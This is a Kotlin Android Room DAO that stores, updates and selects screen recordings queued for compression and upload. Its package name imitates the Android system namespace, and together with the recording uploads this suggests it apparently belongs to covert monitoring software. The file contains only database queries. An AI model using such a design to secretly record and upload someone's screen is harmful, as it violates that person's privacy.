package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ScreenRecording
import com.android.services.util.AppConstants

@Dao
interface ScreenRecordingDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(screenRecording: ScreenRecording)

    @Query("Update screen_recording set status =:status where file =:filePath")
    fun update(filePath: String, status: Int): Int

    @Query("Update screen_recording set isCompressed =:isCompressed where file =:filePath")
    fun update(filePath: String, isCompressed: Boolean): Int

    @Query("Select * from screen_recording where status = :status and isCompressed=:isCompressed order by startDatetime DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllScreenRecordings(status: Int, isCompressed: Boolean): List<ScreenRecording>

    @Query("Select * from screen_recording where status = :status and isCompressed=:isCompressed")
    fun selectAllUncompressedScreenRecordings(
        status: Int,
        isCompressed: Boolean
    ): List<ScreenRecording>
}